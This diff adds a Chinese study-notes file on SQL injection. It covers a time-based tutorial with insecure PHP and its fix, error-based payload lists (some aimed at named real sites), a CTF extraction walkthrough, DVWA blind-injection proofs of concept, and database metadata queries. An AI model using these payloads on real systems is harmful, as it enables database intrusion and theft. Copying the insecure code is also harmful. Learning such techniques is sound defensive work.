@@ -1,0 +1,1593 @@
+8. SQL注入技术分类,以及每一种注入技术的作用
+基于时间的注入(time-based injection):
+参考网址:[User-Agent注入攻击和基于时间的注入](www.freebuf.com/articles/web/105124.html)
+作用:用于猜测数据库名、表名、字段名、数据信息等等
+    延时注入
+    许多 SQL 注入都是在尝试从网站中提取信息（例如用户名、密码或其他隐私信息）。但这条语句却不太一样，它请求数据库进程等待 20 秒。这种攻击属于 SQL 盲注，一般的 SQL 注入会将查询的结果返回到 WEB 页面中，而盲注的攻击者则看不到查询的输出，所以他们会另辟蹊径使用其他的方式来判断注入。两种常见的方法就是使 WEB 服务器产生错误或者产生延时。如上使用 sleep 会是 WEB 服务器等待 20 秒才进行响应，攻击者可以根据响应是否产生延时来判断是否存在注入漏洞。
+    示例
+    为了更好的说明，我使用 PHP 创建了一个不安全的应用，其中会将 User-Agent 保存到 MySQL 数据库中。这类代码可能会存在于真实的应用中用来分析信息，例如统计访问次数。
+    在这个示例中，我忽略了所有良好安全的编码习惯，因为我想阐述下 SQL 的工作原理。
+    再次警告：千万不要复制/粘贴以下代码！因为这些代码并不规范。
+    下面是 PHP 代码：
+    <?php
+    $link = new mysqli('localhost', 'insecure', '1ns3cur3p4ssw0rd', 'analytics');
+    $query = sprintf("INSERT INTO visits (ua, dt) VALUES ('%s', '%s')",
+           $_SERVER["HTTP_USER_AGENT"],
+           date("Y-m-d h:i:s"));
+    $link->query($query);
+    ?>
+    <html><head></head><body><b>Thanks for visiting</b></body></html>
+    这段代码会连接到本地的 analytics 数据库，并将访客 HTTP 头部的 User-Agent 字段不加过滤的插入到数据库中。
+    这就是一个 SQL 注入的例子，但是因为我们的代码不会产生任何错误，所以攻击者无法通过报错来得知是否存在注入漏洞，除非他们使用类似 sleep() 之类的方法。
+    为了验证是否存在注入漏洞，只需要执行如下命令（其中 insecure.php 就是上述示例代码）：
+    curl -A "Mozilla/5.0', (select*from(select(sleep(20)))a)) #" http://example.com/insecure.php
+    这样就会将 HTTP 头部的 User-Agent 字段设置为 Mozilla/5.0', (select*from(select(sleep(20)))a)) #。而我们不安全的 PHP 代码会不加过滤就直接将这些字符串插入查询语句中，此时的查询语句变成了如下样子：
+    INSERT INTO visits (ua, dt) VALUES ('Mozilla/5.0', (select*from(select(sleep(20)))a)) #', '2016-05-17 03:16:06')
+    本来应该插入两个值，但现在只会插入一个值 Mozilla/5.0 并执行 (select*from(select(sleep(20)))a) 语句（这会使数据库休眠 20 秒）。而 # 是注释符，意味着后续的语句被注释并忽略了（就是忽略了插入日期）。
+    此时的数据库中会出现这样一个条目：
+
+    +---------------------+---------------+
+    | dt                  | ua            |
+    +---------------------+---------------+
+    | 0                   | Mozilla/5.0   |
+    +---------------------+---------------+
+    请注意，其中日期值为 0，这正是 (select*from(select(sleep(20)))a) 语句执行的结果，另外 ua 的值为 Mozilla/5.0，而这可能就是攻击者成功执行 SQL 注入后留下的唯一痕迹了。
+    下面是接收到上述请求后服务器的运行结果，我们使用 time 命令来看看这个过程到底需要多长时间：
+    $ time curl -v -A "Mozilla/5.0', (select*from(select(sleep(20)))a) #" http://example.com/insecure.php
+    * Connected to example.com port 80 (#0)
+    > GET /insecure.php HTTP/1.1
+    > Host: example.com
+    > User-Agent: Mozilla/5.0', (select*from(select(sleep(20)))a) #
+    > Accept: */*
+    >
+    < HTTP/1.1 200 OK
+    < Date: Mon, 16 May 2016 10:45:05 GMT
+    < Content-Type: text/html
+    < Transfer-Encoding: chunked
+    < Connection: keep-alive
+    < Server: nginx
+
+    <html><head></head><body><b>Thanks for visiting</b></body></html>
+    * Connection #0 to host example.com left intact
+
+    real   0m20.614s
+    user   0m0.007s
+    sys    0m0.012s
+    看到 20 秒了吗，成功的执行了 SQL 注入。
+    漏洞利用
+    看到这，你也许会想“这的确很简单，但是黑客好像并没有攻击我的网站啊”。
+    但不幸的是，丰富的 SQL 语句使得哪怕是只有 3 行 PHP 代码的 insecure.php，也可以使得攻击者获得远不只使数据库睡眠 20 秒的效果。虽然攻击者执行的 INSERT INTO 的查询只会向数据库中写入数据，但这样仍然可以让他们提取出敏感信息和获取访问权限。
+    为了一个演示的例子，我们在数据库中创建了一个名为 user 的表，其中包含两个用户分别名为 root 和 john。下面来展示攻击者是如何发现存在 john 用户的，他们可以手工构造用户名并根据相应时间来判断是否存在这个用户。
+    例如：
+    curl -A "Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='a')) #" http://example.com/insecure.php
+    这个访问会被立即响应，因为数据库中并没有以 a 打头的用户名，但是
+    curl -A "Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='j')) #" http://example.com/insecure.php
+    这个请求却会花费 20 秒时间。这样在猜出用户名的首字母后，攻击者就可以继续猜测用户名第二个、第三个字母等等，相同的技术还可以用来从数据库中提取其他数据。
+    如果我们的应用比较复杂，例如是一个博客的评论系统，那么我们可以利用这个漏洞将数据库的一些信息转存到一条评论中，这样我们就可以通过访问网页直接查看到数据库信息了,这种方法通常会在需要提取大量数据时使用。
+    代码加固
+    加固代码最好的方式就是像如下这样:
+    <?php
+    $link = new mysqli('localhost', 'analytics_user', 'aSecurePassword', 'analytics_db');
+    $stmt = $link->prepare("INSERT INTO visits (ua, dt) VALUES (?, ?)");
+    $stmt->bind_param("ss", $_SERVER["HTTP_USER_AGENT"], date("Y-m-d h:i:s"));
+    $stmt->execute();
+    ?>
+    <html>
+    <head></head>
+    <body><b>Thanks for visiting</b></body>
+    首先将 SQL 查询语句使用 prepare 进行准备，随后使用 bind_param 绑定两个参数（User-Agent 和日期），最后才是使用 execute 执行查询。
+    bind_param 可以确保一些 SQL 特殊字符会先被进行转义，随后才被执行。现在让我们来看一看在收到跟之前一样的 SQL 注入后数据库中的条目是什么样子的：
+    +---------------------+----------------------------------------------------+
+    | dt                  | ua                                                 |
+    +---------------------+----------------------------------------------------+
+    | 2016-05-17 04:46:02 | Mozilla/5.0',(select*from(select(sleep(20)))a)) #  |
+    +---------------------+----------------------------------------------------+
+    此时，攻击者的 SQL 语句没有被执行而是被简单的存入了数据库当中。
+    总结
+    SQL 注入是攻击者最喜欢使用的攻击方式之一，它可能出任何由攻击者掌控输入的 WEB 应用中。最容易想象的就是出现在各种表单或 URL 之中，但即使是 HTTP 请求头部也同样可能出现。所以从安全角度来说，任何由 WEB 浏览器发送给 WEB 应用的数据都应当被假设为是恶意的。
+
+===============================================================================
+基于错误的注入(error-based injection):
+参考网址:[基于错误回显的SQL注入整理](http://www.51testing.com/html/26/n-3364326.html)
+作用:用于爆出数据库名、表名、字段名、数据信息等等
+    　　0x00 关于错误回显
+    　　用我自己的话来讲，基于错误回显的sql注入就是通过sql语句的矛盾性来使数据被回显到页面上（当然在实际应用中得能回显在页面上，一般的网站都回避免这种情况，哈哈，要是能碰上你就偷着乐吧）。
+    　　0x01  用于错误回显的sql语句（下面的函数楼主只在mysql下试过也能成功，其他数据库有待考证，待有实例的时候会补充）
+    　　第一种：  基于 rand()与group by 的错误
+    　　首先看一下关于rand()函数与group by 在mysql中的错误报告，没错，我们就是要利用group by part of rand() returns duplicate key error这个bug。
+    　　RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.
+    　　You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.
+    　　这个bug会爆出duplicate key这个错误，然后顺便就把数据也给爆了：
+    　　公式：username=admin' and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) and '1' = '1
+    　　第二种： XPATH爆信息
+    　　这里主要用到的是ExtractValue()和UpdateXML()这2个函数，由于mysql 5.1以后提供了内置的XML文件解析和函数，所以这种注入只能用于5.1版本以后
+    　　查看sql手册可知
+    　　语法：EXTRACTVALUE (XML_document, XPath_string);
+    　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+    　　第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+    　　作用：从目标XML中返回包含所查询值的字符串
+    　　语法:UPDATEXML (XML_document, XPath_string, new_value);
+    　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+    　　第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+    　　第三个参数：new_value，String格式，替换查找到的符合条件的数据
+    　　作用：改变文档中符合条件的节点的值
+    　　现在就很清楚了，我们只需要不满足XPath_string(Xpath格式)就可以了，但是由于这个方法只能爆出32位，所以可以结合mid来使用
+    　　公式1：username=admin' and (extractvalue(1, concat(0x7e,(你想获取的数据的sql语句)))) and '1'='1
+    　　公式2：username=admin' and (updatexml(1, concat(0x7e,(你想获取的数据的sql语句)),1)) and '1'='1
+    　　第三种： 重复列爆信息（对于这种方法，我在本地数据库上有试验成功，但是对于下面那道并没有什么作用，就不仔细说明了）
+    　　带上代码：
+    　　payload  id=330&sid=19&cid=261+and+exists(select*from+(select*from(select+name_const(@@version,0))a+join+(select+name_const(@@version,0))b)c)
+    　　0x02  应用
+    　　上面说了那么多，让我们来应用一下吧，基于这道题目
+    　　1.首先我们来爆出他的数据库名
+        结果：r0866cplushua
+    　　username=admin' and (select 5468 from (select count(*), concat(floor(rand(0)*2),0x23,(select database()))x from information_schema.tables group by x )a) and '1' = '1
+    　　2.然后爆他的数据库版本
+        结果:5.1.61-Alibaba-rds-201404-log
+    　　username=admin' and (select 5468 from (select count(*), concat(floor(rand(0)*2),0x23,(select version()))x from information_schema.tables group by x )a) and '1' = '1
+    　　3.接着爆他的表名
+        结果：log    motto   user  这里需要一条一条爆
+    　　username=admin' and (select 5468 from (select count(*), concat(floor(rand(0)*2),0x23,(select column_name from information_schema.tables where table_schema = 'r0866cplushua' limit 0,1))x from information_schema.tables group by x )a) and '1' = '1
+    　　4.然后再爆他的列名
+        结果：id  username  motto（这里我一开始试的是user表但是数据并没有我们想要的，所以换了motto，也需要一条一条的爆）
+    　　username=admin' and (select 5468 from (select count(*), concat(floor(rand(0)*2),0x23,(select column_name from information_schema.columns where table_name='motto' and table_schema = 'r0866cplushua' limit 0,1))x from information_schema.tables group by x )a) and '1' = '1
+    　　5.最后就是爆数据了
+        结果：key#notfound!#    (这里我使用了XPATH爆数据，因为不知道什么原因用第一种方法暴不出来)
+    　　username=admin%27%20and%20(extractvalue(1,%20concat(0x7e,(SELECT%20concat(username,0x3a,motto)%20FROM%20motto%20limit%203,1))))%20and%20%271%27=%271
+    　　到了这里这道题目就算是做出来了。由于楼主刚刚学起上面如果有什么错误，请路过的大牛指正谢谢，同时也希望大牛们可以分享一些其他的注错方法。
+[MySQL暴错注入方法整理](http://www.waitalone.cn/mysql-error-based-injection.html)
+mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法
+1、通过floor暴错
+/*数据库版本*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*简单办法暴库*/
+http://www.waitalone.cn/sql.php?id=info()
+/*连接用户*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*连接数据库*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*暴库*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*暴表*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*暴字段*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*暴内容*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+2、ExtractValue(有长度限制,最长32位)
+http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))
+http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
+3、UpdateXml(有长度限制,最长32位)
+http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+4、NAME_CONST(适用于低版本)
+http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&sid=19&cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
+5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)
+/*数据库版本*/
+http://www.waitalone.cn/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
+本文固定链接: http://www.
+===================================================================================
+MySQL===================================================================================
+SELECT first_name,last_name FROM users where user_id='1';update users set user='1337' WHERE USER_ID=3;select first_name,last_name from users where user_id='1'  #
+
+
+===================================================================================
+Oracle===================================================================================
+
+
+
+===================================================================================
+SQL Server===================================================================================
+
+
+
+
+===================================================================================
+PostgreSQL===================================================================================
+
+
+===================================================================================
+SQLite===================================================================================
+
+
+===================================================================================
+Microsoft Access===================================================================================
+
+
+===================================================================================
+FireBird===================================================================================
+
+
+
+===================================================================================
+SAP MaxDB===================================================================================
+
+
+===================================================================================
+Sybase===================================================================================
+
+
+
+===================================================================================
+IBM DB2===================================================================================
+
+
+===================================================================================
+HSQLLDB===================================================================================
+
+
+
+
+===================================================================================
+===================================================================================
+
+
+======================================================================================
+基于bool的注入(boolean-based injection):
+参考网址:
+作用:
+基于union的注入(union-based injection):
+参考网址:
+作用:进行拖数据操作
+基于stack的注入(stacked-based injection)
+参考网址:
+作用:提权和越权,获取数据信息
+
+[防止sql注入和sqlmap介绍](http://www.cnblogs.com/Lawson/p/5089990.html)
+上面说了如何防止sql注入，下面简单介绍下神器sqlmap，它是一个典型的sql注入检测和利用工具。
+sqlmap支持5种sql注入模式：
+
+1、基于布尔的盲注（Boolean-based blind SQL injection），即可以根据返回页面判断条件真假的注入。
+比如对参数加一个' and '1'='1和' and '1'='2，如果第一个能查询出来，第二个不行，则说明可以注入，后面可以根据字段and exist(...)不断猜测。
+MySQL===================================================================================
+猜测数据库信息
+POC（proof of concept)
+test:
+select first_name,last_name from users where user_id ='1' and substring(database(),1,1) = 'd'  #--
+猜测数据库名的长度
+select first_name,last_name from users where user_id ='1' and substring(database(),1,1) = 'd'  and length(database())<5 # --
+
+猜测表信息
+select count(*) from information_schema.schemata where schema_name='dvwa'
+猜测表的个数
+select count(*) from information_schema.tables where table_schema = 'dvwa'
+猜测表名
+select first_name,last_name from dvwa.users where user_id ='1' and (select count(*) from information_schema.tables where table_schema = 'dvwa' and substring(table_name,1,1) = 'k')  #
+select * from information_schema.tables where table_schema = 'dvwa' and substring(table_name,1,1) = 'g'
+select * from information_schema.tables where table_schema = 'dvwa' and substring(table_name,9,1) = 'k'
+select * from information_schema.tables where table_schema = 'dvwa' and substring(table_name,10,1) = 'k'
+猜测表的列的个数
+select * from information_schema.columns where table_schema='dvwa' and table_name ='users'
+
+select count(*) from information_schema.columns where table_schema='dvwa' and table_name ='users'
+猜测列名
+
+select count(*) from (select * from information_schema.columns where table_schema='dvwa' and table_name ='users' limit 0,1) a where substring(a.column_name,1,1)='u'
+select first_name,last_name from users where user_id = '1' and(select count(*) from (select * from information_schema.columns where table_schema='dvwa' and table_name ='users' limit 0,1) a where substring(a.column_name,1,10)='user_id')
+select first_name,last_name from users where user_id = '1' and(select count(*) from (select * from information_schema.columns where table_schema='dvwa' and table_name ='users' limit 0,1) a where substring(a.column_name,1,10)='user_id') #
+
+猜测列名的长度
+select first_name,last_name from dvwa.users where user_id ='1' and (select count(*) from information_schema.tables where table_schema = 'dvwa' and length(table_name)<6)  #
+猜测数据信息
+select * from users where substring(user_id,1,1)='1'
+select * from users where substring(user_id,1,1)='2'
+
+select first_name,last_name from users where user_id='1' and (select count(*) from users where substring(user_id,1,1)='9')
+select first_name,last_name from users where user_id='1' and (select count(*) from users where substring(user_id,1,1)='1')
+
+select first_name,last_name from users where user_id='1' and (select count(*) from users where substring(first_name,2,1)='d')
+===================================================================================
+Oracle===================================================================================
+查看Oracle数据库名和实例名(http://blog.csdn.net/f_zongjian/article/details/5832676)
+==查看数据库名
+SQL> select name from v$database;
+
+NAME
+---------
+ORCL
+
+
+SQL> desc v$database;
+ 名称                                      是否为空? 类型
+ ----------------------------------------- -------- ----------------------------
+
+ DBID                                               NUMBER
+ NAME                                               VARCHAR2(9)
+ CREATED                                            DATE
+ RESETLOGS_CHANGE#                                  NUMBER
+ RESETLOGS_TIME                                     DATE
+ PRIOR_RESETLOGS_CHANGE#                            NUMBER
+ PRIOR_RESETLOGS_TIME                               DATE
+ LOG_MODE                                           VARCHAR2(12)
+ CHECKPOINT_CHANGE#                                 NUMBER
+ ARCHIVE_CHANGE#                                    NUMBER
+ CONTROLFILE_TYPE                                   VARCHAR2(7)
+ CONTROLFILE_CREATED                                DATE
+ CONTROLFILE_SEQUENCE#                              NUMBER
+ CONTROLFILE_CHANGE#                                NUMBER
+ CONTROLFILE_TIME                                   DATE
+ OPEN_RESETLOGS                                     VARCHAR2(11)
+ VERSION_TIME                                       DATE
+ OPEN_MODE                                          VARCHAR2(10)
+ PROTECTION_MODE                                    VARCHAR2(20)
+ PROTECTION_LEVEL                                   VARCHAR2(20)
+ REMOTE_ARCHIVE                                     VARCHAR2(8)
+ ACTIVATION#                                        NUMBER
+ SWITCHOVER#                                        NUMBER
+ DATABASE_ROLE                                      VARCHAR2(16)
+ ARCHIVELOG_CHANGE#                                 NUMBER
+ ARCHIVELOG_COMPRESSION                             VARCHAR2(8)
+ SWITCHOVER_STATUS                                  VARCHAR2(20)
+ DATAGUARD_BROKER                                   VARCHAR2(8)
+ GUARD_STATUS                                       VARCHAR2(7)
+ SUPPLEMENTAL_LOG_DATA_MIN                          VARCHAR2(8)
+ SUPPLEMENTAL_LOG_DATA_PK                           VARCHAR2(3)
+ SUPPLEMENTAL_LOG_DATA_UI                           VARCHAR2(3)
+ FORCE_LOGGING                                      VARCHAR2(3)
+ PLATFORM_ID                                        NUMBER
+ PLATFORM_NAME                                      VARCHAR2(101)
+ RECOVERY_TARGET_INCARNATION#                       NUMBER
+ LAST_OPEN_INCARNATION#                             NUMBER
+ CURRENT_SCN                                        NUMBER
+ FLASHBACK_ON                                       VARCHAR2(18)
+ SUPPLEMENTAL_LOG_DATA_FK                           VARCHAR2(3)
+ SUPPLEMENTAL_LOG_DATA_ALL                          VARCHAR2(3)
+ DB_UNIQUE_NAME                                     VARCHAR2(30)
+ STANDBY_BECAME_PRIMARY_SCN                         NUMBER
+ FS_FAILOVER_STATUS                                 VARCHAR2(21)
+ FS_FAILOVER_CURRENT_TARGET                         VARCHAR2(30)
+ FS_FAILOVER_THRESHOLD                              NUMBER
+ FS_FAILOVER_OBSERVER_PRESENT                       VARCHAR2(7)
+ FS_FAILOVER_OBSERVER_HOST                          VARCHAR2(512)
+
+---------------------------------------
+==查看实例名
+SQL> select instance_name from v$instance;
+
+INSTANCE_NAME
+----------------
+orcl
+
+
+
+SQL> desc v$instance;
+ 名称                                      是否为空? 类型
+ ----------------------------------------- -------- --------------
+
+ INSTANCE_NUMBER                                    NUMBER
+ INSTANCE_NAME                                      VARCHAR2(16)
+ HOST_NAME                                          VARCHAR2(64)
+ VERSION                                            VARCHAR2(17)
+ STARTUP_TIME                                       DATE
+ STATUS                                             VARCHAR2(12)
+ PARALLEL                                           VARCHAR2(3)
+ THREAD#                                            NUMBER
+ ARCHIVER                                           VARCHAR2(7)
+ LOG_SWITCH_WAIT                                    VARCHAR2(15)
+ LOGINS                                             VARCHAR2(10)
+ SHUTDOWN_PENDING                                   VARCHAR2(3)
+ DATABASE_STATUS                                    VARCHAR2(17)
+ INSTANCE_ROLE                                      VARCHAR2(18)
+ ACTIVE_STATE                                       VARCHAR2(9)
+ BLOCKED                                            VARCHAR2(3)
+
+一、查看当前用户信息：
+1、查看当前用户拥有的角色权限信息：select * from role_sys_privs;
+2、查看当前用户的详细信息：select * from user_users;
+3、查看当前用户的角色信息：select * from user_role_privs;
+
+总结：ORACLE中数据字典视图分为3大类,用前缀区别，分别为：USER，ALL 和 DBA，
+许多数据字典视图包含相似的信息。
+USER_*：有关用户所拥有的对象信息，即用户自己创建的对象信息。
+ALL_*：有关用户可以访问的对象的信息，即用户自己创建的对象的信息加上其他用户创建的对象但该用户有权访问的信息。
+DBA_*：有关整个数据库中对象的信息。
+其他：
+查看用户和默认表空间的关系。
+select username,default_tablespace from dba_users;
+1.查看表结构：desc表名
+2.查看当前用户的表：
+select table_name from user_tables;
+3.查看所有用户的表名：
+select table_name from all_tables;
+4.查看所有表名（其中包括系统表）
+select table_name from all_tables;
+5.查看所有的表:
+select * from tab/dba_tables/dba_objects/cat;
+下面介绍Oracle查询用户表空间
+◆Oracle查询用户表空间：select * from user_all_tables
+◆Oracle查询所有函数和储存过程：select * from user_source
+◆Oracle查询所有用户：select * from all_users.select * from dba_users
+◆Oracle查看当前用户连接：select * from v$Session
+◆Oracle查看当前用户权限：select * from session_privs
+◆Oracle查看用户表空间使用情况：
+select a.file_id "FileNo",a.tablespace_name
+"Tablespace_name",
+a.bytes "Bytes",a.bytes-sum(nvl(b.bytes,0)) "Used",
+sum(nvl(b.bytes,0)) "Free",
+sum(nvl(b.bytes,0))/a.bytes*100 "%free"
+from dba_data_files a, dba_free_space b
+where a.file_id = b .file_id(+)
+group by a.tablespace_name ,
+a.file_id,a.bytes order by a.tablespace_name;
+1.查看所有用户：
+select * from dba_user;
+select * from all_users;
+select * from user_users;
+2.查看用户系统权限：
+select * from dba_sys_privs;
+select * from all_sys_privs;
+select * from user_sys_privs;
+
+3.查看用户对象权限：
+select * from dba_tab_privs;
+select * from all_tab_privs;
+select * from user_tab_privs;
+
+4.查看所有角色：
+select * from dba_roles;
+
+5.查看用户所拥有的角色：
+select * from dba_role_privs;
+
+select * from user_role_privs;
+6.查看角色所拥有的权限:
+select * from role_sys_privs;
+select * from role_tab_privs;
+7.查看所有系统权限
+select * from system_privilege_map;
+8.查看所有对象权限
+select * from table_privilege_map;
+以上是在Oracle中查看用户权限 ，
+在DB2中为：
+select * from syscat.dbauth
+或者
+get authorizations
+查看sid
+
+select * from v$instance
+
+
+一、oracle 的sql语句查看指定用户下表的数量
+------------------------------------------------------------------------------------------------------------
+
+语法：
+
+select * from dba_tables t where t.owner='用户id';
+
+dba_tables： 是有权限的DBA
+
+用户id： oracle用户名
+
+demo：
+Sql代码
+select count(*) from dba_tables t where t.owner='SCOTT';
+select count(*) from dba_tables t where t.owner='SCOTT';
+执行结果：
+
+COUNT(*)
+----------
+        42
+
+这个42就是指的SCOTT用户下的表的数量
+
+-------------------------------------------------------------------------------------------------------------------------
+
+二、查看当前登陆用户表数量
+
+select table_name from user_tables
+
+执行结果：
+
+列出表名
+
+已选择10行。
+
+Sql代码
+select count(table_name) from user_tables
+select count(table_name) from user_tables
+执行结果
+
+COUNT(TABLE_NAME)
+-----------------
+               10
+
+扩展：
+
+对应的还有查找所有的视图，索引，存储过程...
+
+Sql代码
+select view_name from user_views
+select index_name from user_indexs
+select view_name from user_viewsselect index_name from user_indexs
+一些语法：
+
+user_tables用于存储用户分配的表视图
+dba_tables用于存储管理员分配的表视图
+all_tables用户存储数据库中所有的表的视图
+
+
+1.查询表名：
+select table_name,tablespace_name,temporary from user_tables [where table_name=表名]
+
+其中：table_name:表名（varchar2(30)）;
+tablespace_name:存储表名的表空间（varchar2（30））；
+temporary:是否为临时表（varchar2（1））。
+eg: select table_name,tablespace_name,temporary from user_tables where table_name='TEST_TEMP';
+结果：
+
+--------------------------------------------------------------------------------
+table_name tablespace_name temporary
+TEST_TEMP SDMP N
+
+--------------------------------------------------------------------------------
+注：表名变量值必须大写。
+2.查询表列名：
+
+select column_name,data_type ,data_length,data_precision,data_scale from user_tab_columns [where table_name=表名];
+
+其中：column_name:列名（varchar2(30)）;
+data_type:列的数据类型（varchar2(106)）;
+data_length:列的长度（number);
+eg:select column_name,data_type ,data_length,data_precision,data_scale from user_tab_columns where table_name='TEST_TEMP';
+结果：
+
+--------------------------------------------------------------------------------
+column_name data_type data_length data_precision data_scale
+ID NUMBER 22 0
+NAME NVARCHAR2 20
+SEX CHAR 1
+GRADE NVARCHAR2 10
+
+--------------------------------------------------------------------------------
+
+注：表名变量值必须大写。
+另外，也可以通过 all_tab_columns来获取相关表的数据。
+eg:select * from all_tab_columns where table_name='TEST_TEMP';
+
+SQL和Oracle中统计数据库中表个数及表名(http://blog.csdn.net/lxping1012/article/details/6959890)
+SQL中统计表的个数：
+SELECT    count(*)  FROM    sys.objects    WHERE     XType='U'    //表个数
+SELECT    count(*)  FROM    sys.objects    WHERE     XType= 'V'    //视图个数
+SELECT    count(*)  FROM    sys.objects    WHERE     XType= 'P'    //存储过程个数
+SQL获得表名：
+SELECT name  FROM sys.objects WHERE XTYPE='U'
+
+ORCALE中统计数据表的总个数：
+SELECT    count(*)   FROM    dba_tables    WHERE     owner='用户名'    ————有DBA权限
+SELECT    count(*)   FROM    all_tables     WHERE     owner='用户名'    ————普通用户权限
+ORCALE获得表名：
+SELECT    name    FROM    dba_tables    WHERE     owner='用户名'
+SELECT    name    FROM    all_tables     WHERE     owner='用户名'
+===================================================================================
+SQL Server===================================================================================
+(http://wl-ldy.iteye.com/blog/1255007)
+补充：
+sql server sysobjects xtype类型：
+
+xtype  代表类型
+
+C = CHECK 约束
+D = 默认值或 DEFAULT 约束
+F = FOREIGN KEY 约束
+L = 日志
+FN = 标量函数
+IF = 内嵌表函数
+P = 存储过程
+PK = PRIMARY KEY 约束（类型是 K）
+RF = 复制筛选存储过程
+S = 系统表
+TF = 表函数
+TR = 触发器
+U = 用户表
+UQ = UNIQUE 约束（类型是 K）
+V = 视图
+1.获取所有数据库名:
+SELECT Name FROM Master..SysDatabases ORDER BY Name
+2.获取所有表名:
+SELECT Name FROM DatabaseName..SysObjects Where XType='U' ORDER BY Name
+XType='U':表示所有用户表;
+XType='S':表示所有系统表;
+3.获取所有字段名:
+SELECT Name FROM SysColumns WHERE id=Object_Id('TableName')
+
+[SQL获取所有用户名,数据库名、所有表名](http://www.cnblogs.com/ywb-lv/archive/2012/10/31/2747340.html)
+1.获取所有用户名:
+SELECT name FROM Sysusers where status='2'and islogin='1'
+islogin='1'表示帐户
+islogin='0'表示角色
+status='2'表示用户帐户
+status='0'表示糸统帐户
+2.获取所有数据库名:
+SELECT Name FROM Master..SysDatabases ORDER BY Name
+3.获取所有表名
+SELECT Name FROM DatabaseName..SysObjects Where XType='U'ORDER BY Name
+XType='U':表示所有用户表;
+XType='S':表示所有系统表;
+4.获取所有字段名:
+SELECT Name FROM SysColumns WHERE id=Object_Id('TableName')
+5.获取数据库所有类型
+select name from systypes
+6.获取主键字段
+SELECT   name FROM SysColumns WHERE id=Object_Id('表名') and colidin(selectkeyno from sysindexkeyswhereid=Object_Id('表名'))
+
+存储过程获取主键
+sp_helpindex     '表名'
+
+7、获取字段类型
+select a.name as [column],b.name as type from syscolumns a,systypes b where a.id=object_id('表名') and a.xtype=b.xtype
+或者可以通过存储过程
+exec sp_help 表名
+8、取表结构
+select column_name,data_type,character_maximum_length from information_schema.columns where table_name = '表名'
+
+
+
+===================================================================================
+PostgreSQL===================================================================================
+[PostgreSQL 中获取表名、数据库名称的方法](http://my.oschina.net/weiwubunengxiao/blog/222348)
+①表名
+SELECT tablename FROM pg_tables WHERE tablename NOT LIKE 'pg%' AND tablename NOT LIKE 'sql_%'
+
+②数据库名
+SELECT datname FROM pg_database;
+
+③列名
+select * from information_schema.columns where table_name = 'final_back_pg_lv10'
+
+-------------------------postgreSQL获取主键
+select
+pg_constraint.conname as pk_name,
+pg_attribute.attname as colname,
+pg_type.typname as typename
+from
+pg_constraint
+inner join pg_class on pg_constraint.conrelid = pg_class.oid
+inner join pg_attribute on pg_attribute.attrelid = pg_class.oid  and  pg_attribute.attnum = pg_constraint.conkey[1]
+inner join pg_type on pg_type.oid = pg_attribute.atttypid
+where pg_class.relname = 'tableName'
+and pg_constraint.contype='p'
+and pg_table_is_visible(pg_class.oid)  --表在搜索中可见
+
+-------------------------postgreSQL获取字段信息
+SELECT COL_DESCRIPTION(A.ATTRELID, A.ATTNUM) AS COMMENT,
+       FORMAT_TYPE(A.ATTTYPID, A.ATTTYPMOD) AS TYPE,
+       A.ATTNAME AS NAME,
+       A.ATTNOTNULL AS NOTNULL
+  FROM PG_CLASS AS C, PG_ATTRIBUTE AS A
+ WHERE C.RELNAME = 'tableName'
+   AND A.ATTRELID = C.OID
+   AND A.ATTNUM > 0
+
